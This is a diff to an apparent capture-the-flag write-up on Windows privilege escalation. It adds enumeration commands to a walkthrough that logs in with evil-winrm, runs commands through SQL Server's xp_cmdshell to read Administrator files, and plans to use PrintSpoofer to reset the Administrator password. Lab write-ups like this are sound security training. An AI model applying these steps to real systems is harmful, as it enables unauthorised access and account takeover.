@@ -214,6 +214,13 @@ evil-winrm -i <your-box-ip> -u alice.wonderland -p newP@ssword2025
 
 We don't have any special privileges, but we find a folder called 'SQL2019' in the C:\ directory.
 
+```
+whoami /priv
+```
+```
+dir c:\
+```
+
 ![](img/025.png)
 
 ![](img/015.png)
@@ -249,6 +256,10 @@ sqlcmd -S tcp:127.0.0.1,1433 -E -Q "EXEC xp_cmdshell 'type C:\Users\Administrato
 ![](img/017.png)
 
 We have `SeImpersonatePrivilege` privileges so we can use [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe) to change the Administrator's password.
+
+```
+sqlcmd -S tcp:127.0.0.1,1433 -E -Q "EXEC xp_cmdshell 'whoami /priv';"
+```
 
 ![](img/018.png)
 
